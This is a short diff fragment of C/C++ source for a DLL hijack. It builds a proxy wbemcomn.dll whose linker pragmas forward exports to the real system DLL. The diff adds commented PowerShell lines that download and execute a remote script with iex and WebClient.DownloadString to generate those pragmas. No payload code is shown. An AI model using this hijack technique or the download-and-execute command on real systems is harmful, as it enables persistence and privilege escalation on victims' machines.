@@ -8,6 +8,9 @@
 // If you are targeting a different version of Windows you will probably need to regenerate these pragmas
 // for the hijack to succeed.
 
+// PS C:\Users\admin> iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Get-Exports.ps1')
+// PS C:\Users\admin> Get-Exports -DllPath C:\windows\system32\wbemcomn.dll -ExportsToCpp .\out.cpp
+
 #pragma comment (linker, "/export:??0?$CLockableFlexArray@VCStaticCritSec@@@@QEAA@$$QEAV0@@Z=c:/windows/system32/wbemcomn.??0?$CLockableFlexArray@VCStaticCritSec@@@@QEAA@$$QEAV0@@Z,@1")
 #pragma comment (linker, "/export:??0?$CLockableFlexArray@VCStaticCritSec@@@@QEAA@AEAV0@@Z=c:/windows/system32/wbemcomn.??0?$CLockableFlexArray@VCStaticCritSec@@@@QEAA@AEAV0@@Z,@2")
 #pragma comment (linker, "/export:??0?$CLockableFlexArray@VCStaticCritSec@@@@QEAA@XZ=c:/windows/system32/wbemcomn.??0?$CLockableFlexArray@VCStaticCritSec@@@@QEAA@XZ,@3")
